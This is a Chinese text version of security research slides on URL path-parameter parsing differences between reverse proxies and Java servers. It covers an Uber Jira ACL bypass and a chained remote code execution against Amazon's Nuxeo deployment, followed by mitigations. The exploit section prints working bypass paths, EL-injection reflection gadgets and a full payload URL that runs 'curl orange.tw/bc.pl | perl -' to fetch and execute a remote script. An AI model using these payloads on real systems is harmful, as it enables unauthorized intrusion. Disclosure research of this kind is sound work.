# 猫
- 作者: Michael Saechang, Jonathan Leung, daisuke1230 (来自Flickr)

## 议程
1. 介绍问题的复杂性
2. 深入回顾现有的实现
3. 新的多层架构攻击面
   - Bynder上的远程代码执行
   - Amazon上的远程代码执行

**注**: 感谢Amazon和Bynder对漏洞披露的快速响应和开放态度。

## URL路径参数
- **d**
- 一些研究人员已经提到这可能会导致问题，但仍然取决于编程错误。
- 如何让旧系统适应新方法？

示例:
```
http://example.com/foo;name=orange/bar/
```

## 反向代理架构
- 资源共享
- 负载均衡
- 缓存
- 安全

### 客户端
- 静态文件
  - 图片
  - 脚本
  - 文件

### 服务器
- Tomcat
- Apache

### 多层架构
- 示例:
  ```
  http://example.com/foo;name=orange/bar/
  ```

#### 行为
- **Apache**: `/foo;name=orange/bar/`
- **Nginx**: `/foo;name=orange/bar/`
- **IIS**: `/foo;name=orange/bar/`
- **Tomcat**: `/foo/bar/`
- **Jetty**: `/foo/bar/`
- **WildFly**: `/foo`
- **WebLogic**: `/foo`

### BadProxy.org
- 这只是一个玩笑，并非真正的网站。

### 漏洞可能的原因
- 绕过白名单和黑名单ACL
- 逃逸上下文映射
- 管理接口
- Web容器控制台和监控
- 同一服务器上的多个Web上下文

### 是否受影响？
- 如果您使用反向代理和Java作为后端服务，则默认情况下可能存在此架构问题。
- **Apache mod_jk**
- **Apache mod_proxy**
- **Nginx ProxyPass**

示例:
```
http://example.com/portal/..;/manager/html
```

### Uber漏洞案例
- Uber不允许直接访问`*.uberinternal.com`
- 通过Nginx重定向到OneLogin SSO
- 监控目的的白名单？

示例:
```
https://jira.uberinternal.com/status
https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa
```

### Amazon远程代码执行案例
- 在Amazon Collaborate System上发现远程代码执行漏洞
- 找到站点`collaborate-corp.amazon.com`
- 使用开源项目Nuxeo
- 通过链式利用多个漏洞和功能实现RCE

#### 路径规范化漏洞导致ACL绕过
- ACL如何获取当前请求页面？
  ```java
  protected static String getRequestedPage(HttpServletRequest httpRequest) {
      String requestURI = httpRequest.getRequestURI();
      String context = httpRequest.getContextPath() + '/';
      String requestedPage = requestURI.substring(context.length());
      int i = requestedPage.indexOf(';');
      return i == -1 ? requestedPage : requestedPage.substring(0, i);
  }
  ```
- 路径处理在ACL控制中与servlet容器不一致，因此可以绕过白名单

#### 代码复用漏洞导致表达式语言注入
- 大多数页面返回`NullPointerException`
- Nuxeo将`*.xhtml`映射到Seam框架
- 通过阅读源代码，我们发现了Seam暴露的许多黑客友好的特性

示例:
```
http://127.0.0.1/home.xhtml?actionMethod:/foo.xhtml:utils.escape(...)
"#{util.escape(...)}"
```

#### 更糟糕的是，如果之前的EL返回一个字符串形式的EL，Seam会再次评估
示例:
```
http://127.0.0.1/home.xhtml?actionMethod:/foo.xhtml:utils.escape(...)
return "#{malicious}"
```

#### 我们可以在servlet上下文中的任何文件中执行部分EL，但需要找到一个好的gadget来控制返回值
示例:
```
widgets/suggest_add_new_directory_entry_iframe.xhtml
```

#### EL黑名单绕过导致远程代码执行
示例:
```java
"".getClass().forName("java.lang.Runtime")
""["class"].forName("java.lang.Runtime")
```

#### 将所有步骤链接在一起
1. 路径规范化漏洞导致ACL绕过
2. 绕过白名单访问未经授权的Seam servlet
3. 使用Seam的`actionMethod`功能调用文件中的gadget
4. 在`directoryNameForPopup`中准备第二阶段的有效载荷
5. 绕过EL黑名单并使用Java反射API运行shell命令

示例:
```
https://host/nuxeo/login.jsp;/..;/create_file.xhtml
?actionMethod=widgets/suggest_add_new_directory_entry_iframe.xhtml:request.getParameter('directoryNameForPopup')
&directoryNameForPopup=/?=#{request.setAttribute('methods', ''['class'].forName('java.lang.Runtime').getDeclaredMethods())---request.getAttribute('methods')[15].invoke(request.getAttribute('methods')[7].invoke(null), 'curl orange.tw/bc.pl | perl -')}
```

### 总结
1. 路径解析器中的隐含属性和边缘情况
2. 多层架构的新攻击面
3. 新CVE和漏洞赏金计划中的案例研究

### 缓解措施
- 隔离后端应用程序
- 移除管理控制台
- 删除其他servlet上下文
- 检查代理和后端服务器之间的行为
- 仅作为概念验证，在Tomcat和Jetty上禁用URL路径参数

### 参考资料
- Java Servlets and URI Parameters (作者: @cdivilly)
- 2 path traversal defects in Oracle's JSF2 implementation (作者: Synopsys Editorial Team)
- CVE-2010-1871: JBoss Seam Framework remote code execution (作者: @meder)

感谢您的阅读！